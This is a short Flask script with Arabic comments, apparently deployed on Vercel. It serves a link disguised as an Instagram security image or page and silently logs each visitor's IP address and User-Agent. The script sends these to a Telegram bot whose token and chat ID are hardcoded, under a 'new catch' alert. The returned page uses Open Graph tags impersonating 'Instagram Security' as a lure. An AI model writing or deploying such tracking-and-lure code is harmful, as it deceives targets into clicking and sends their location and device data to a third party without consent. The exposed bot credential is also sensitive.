from flask import Flask, request
import requests

app = Flask(__name__)

# التوكن والآيدي مأخوذين بدقة من صورك لضمان العمل
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQS0zvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    # تم تصحيح الكلمة من bet إلى bot هنا
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

@app.route('/')
@app.route('/photo.jpg')
def track():
    # جلب الـ IP من هيدرز Vercel
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = request.headers.get('User-Agent', 'Unknown')
    
    report = (
        f"🎯 <b>تنبيه صيد جديد!</b>\n"
        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
        f"📱 <b>الجهاز:</b> {ua}"
    )
    
    send_to_telegram(report)
    
    # الصفحة التمويهية التي طلبتها
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:title" content="Instagram Security">
        <meta property="og:description" content="Confirm your identity to continue.">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
    </head>
    <body><h1>404 Not Found</h1></body>
    </html>
    """, 200

if __name__ == '__main__':
    app.run()
